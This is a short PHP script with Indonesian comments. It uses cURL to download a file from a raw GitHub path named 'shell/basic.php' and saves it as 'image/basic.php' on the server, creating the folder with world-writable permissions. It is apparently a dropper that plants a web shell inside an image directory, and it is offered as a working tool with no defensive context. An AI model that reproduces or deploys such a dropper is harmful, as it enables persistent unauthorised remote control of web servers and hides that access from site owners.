<?php

$folder = 'image';
$file_name = 'basic.php';
$file_path = $folder . '/' . $file_name;

// Fungsi untuk mendownload file dari GitHub
function downloadFromGitHub($url, $path) {
    // Inisialisasi cURL
    $ch = curl_init();
    
    // Set opsi cURL
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    
    // Eksekusi cURL
    $data = curl_exec($ch);
    
    // Tutup cURL
    curl_close($ch);
    
    // Periksa apakah data berhasil didownload
    if ($data !== false) {
        // Buat direktori jika belum ada
        $dir = dirname($path);
        if (!is_dir($dir)) {
            mkdir($dir, 0777, true);
        }
        // Tulis data ke file
        file_put_contents($path, $data);
        echo "File berhasil didownload dari GitHub dan disimpan di $path\n";
    } else {
        echo "Gagal mendownload file dari GitHub\n";
    }
}

// URL file di GitHub
$github_url = 'https://raw.githubusercontent.com/aainsomnia/tools_original/main/shell/basic.php';

// Download file dari GitHub
downloadFromGitHub($github_url, $file_path);

?>
